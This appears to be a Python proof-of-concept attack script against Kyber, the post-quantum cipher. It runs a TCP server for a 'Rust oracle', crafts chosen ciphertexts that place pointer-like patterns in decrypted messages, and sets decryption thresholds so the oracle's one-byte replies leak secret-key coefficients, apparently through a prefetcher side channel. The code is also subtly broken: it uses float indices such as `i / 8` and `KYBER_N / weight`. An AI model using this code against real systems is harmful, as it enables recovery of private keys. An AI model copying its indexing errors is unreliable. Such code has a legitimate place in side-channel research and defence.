import random
import socket
import struct
from typing import List, Sequence, Union

from src.kyber_lib_functions import (
    KYBER_INDCPA_BYTES,
    KYBER_N,
    KYBER_Q,
    Poly,
    PolyVec,
    pack_ciphertext,
)

CRYPTO_CIPHERTEXTBYTES = KYBER_INDCPA_BYTES


def recv_exact(sock: socket.socket, n: int) -> bytes:
    """Read exactly *n* bytes or raise if the peer closes."""
    data = bytearray()
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("peer closed connection")
        data.extend(chunk)
    return bytes(data)


class KyberOracle:
    """Wraps the blocking TCP conversation with the Rust oracle."""

    def __init__(self, host: str, port: int):
        self._listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._listener.bind((host, port))
        self._listener.listen(1)
        print(f"Kyber-oracle server ready on {host}:{port}, waiting for Rust…")

        self._sock, addr = self._listener.accept()
        print("Rust oracle connected from", addr)

        self.rand_mask = recv_exact(self._sock, 8)
        self.masked_addr = recv_exact(self._sock, 8)
        self.lowest_message_bit = 7
        # There is an off-by-one problem: if message bit is 0, then
        # (v - dot(u, s))[lowest_message_bit] - threshold result in 0
        # when the value is Q/4=832, but when message bit is 1, we
        # instead get -832 which is compressed to 1! That is because uncompressed v instead of Q/2=1664 goes to 1665. So, we look
        # for offset of message which has a one at sensitive for DMP
        # position, but we XOR that position with 1, so we end up
        # with zero
        for i in range(7, 56):
            rbit = (self.rand_mask[i / 8] >> (i & 7)) & 1
            mabit = (self.masked_addr[i / 8] >> (i & 7)) & 1
            mbit = rbit ^ mabit
            if mbit == 1:
                self.lowest_message_bit = i
                break

    def query(self, ct: bytes) -> int:
        """
        Send one ciphertext to Rust and return its single-byte reply.
        """
        assert len(ct) == CRYPTO_CIPHERTEXTBYTES, "ciphertext size mismatch"

        self._sock.sendall(b"\x00")  # continuation flag
        self._sock.sendall(ct)  # ciphertext
        return recv_exact(self._sock, 1)[0]

    def close(self):
        """Tell Rust we're done (send non-zero) and close."""
        try:
            self._sock.sendall(b"\x01")
        finally:
            self._sock.close()
            self._listener.close()


def read_sk(filename):
    with open(filename, "rt") as f:
        sk = [int(line) for line in f if line.strip()]
    return sk


def build_polymsg_from_oracle(oracle, val_for_one, use_random) -> Poly:
    """
    Create a message encoded in polynomial that should appear for
    victim. The first 64-bit contain a target pointer that is computed
    as XOR of mask and masked address (computed byte-by-byte, so, we
    don't make target address to appear in out memory)
    Other bits contain random 64-bit pointers (but no so different
    from target) if use_random is True, otherwise, put the same pointer
    to other positions
    """
    v = Poly()
    msg_byte_index = oracle.lowest_message_bit // 8
    msg_bit_mask = 1 << (oracle.lowest_message_bit & 7)

    for pointer_idx in range(4):
        # Extra entropy for blocks 1-3 (block 0 is deterministic)
        extra_rand64 = 0
        if use_random and pointer_idx:
            # keep regenerating until it does NOT cancel the message bit
            while True:
                extra_rand64 = random.getrandbits(64) & 0xFFFF00
                if extra_rand64 ^ (1 << oracle.lowest_message_bit):
                    break

        for byte_idx in range(8):
            # one-byte unmasking (never the whole pointer!)
            byte_val = (
                oracle.masked_addr[byte_idx]
                ^ oracle.rand_mask[byte_idx]
                ^ (msg_bit_mask if byte_idx == msg_byte_index else 0)
                ^ ((extra_rand64 >> (8 * byte_idx)) & 0xFF)
            )

            # map the 8 bits of this byte to polynomial coefficients
            base = pointer_idx * 64 + byte_idx * 8
            for bit in range(8):
                v.coeffs[base + bit] = val_for_one * ((byte_val >> bit) & 1)

    return v


def build_arbitrary_combination_ciphertext(
    z_values: List[int],
    weight: int,
    threshold_value: int,
    k_step: int,
    sk_idxs: List[int],
    oracle: KyberOracle,
):
    """Create a ciphertext that for Kyber should decrypt to a message m,
    where m[lowest_message_bit] bit depends whether inequality
    involving sk[idx] for idx from sk_idxs is satisfied
    """
    u = PolyVec()

    v = build_polymsg_from_oracle(oracle, KYBER_Q // 2 + 1, use_random=True)
    mask = KYBER_N - 1
    for i in range(weight):
        u_coef = z_values[i]
        block_idx = sk_idxs[i] // KYBER_N
        u_block_offset = sk_idxs[i] & mask
        if oracle.lowest_message_bit >= u_block_offset:
            u_coef = -u_coef

        target_idx = (oracle.lowest_message_bit - u_block_offset) & mask
        u.vec[block_idx].coeffs[target_idx] = u_coef

    # Usually decryption failure is triggered by adding Q/4 noise to v,
    # but here we modify it to Q/4 +- Q/16 * k for Kyber512 and
    # Kyber768
    threshold_k = 4 - threshold_value
    v_offset = oracle.lowest_message_bit
    v.coeffs[v_offset] += threshold_k * k_step
    return pack_ciphertext(u, v)


def build_full_rotate_ciphertext(
    z_values: List[int],
    weight: int,
    threshold_values: List[int],
    enabled: List[int],
    signs: List[int],
    k_step: int,
    block_idx: int,
    var_offset: int,
    oracle: KyberOracle,
):
    """Create a ciphertext that for Kyber should decrypt to a message m,
    where m[lowest_message_bit + 64*i] bit depends whether inequality
    involving sk[var_offset + 64*j + 256 * block_idx] is satisfied
    """
    u = PolyVec()

    v = build_polymsg_from_oracle(oracle, KYBER_Q // 2 + 1, use_random=True)
    mask = KYBER_N - 1
    rotation_offset = KYBER_N / weight
    for i in range(weight):
        if i == 0:
            u_coef = -z_values[0]
            if oracle.lowest_message_bit < var_offset:
                u_coef = -u_coef
        else:
            u_coef = z_values[weight - i]

        u_offset = (rotation_offset * i + oracle.lowest_message_bit - var_offset) & mask
        u.vec[block_idx].coeffs[u_offset] = u_coef
    skipped = 0
    for i in range(weight):
        sign = 0
        if i > 0:
            sign = signs[i - 1]
            if enabled[i - 1] == 0:
                skipped += 1
                continue
        # Usually decryption failure is triggered by adding Q/4 noise to v,
        # but here we modify it to Q/4 +- Q/16 * k for Kyber512 and
        # Kyber768
        threshold_k = 4 - threshold_values[i - skipped]
        if sign:
            threshold_k = -threshold_k
        v_offset = rotation_offset * i + oracle.lowest_message_bit
        v.coeffs[v_offset] += threshold_k * k_step
    return pack_ciphertext(u, v)
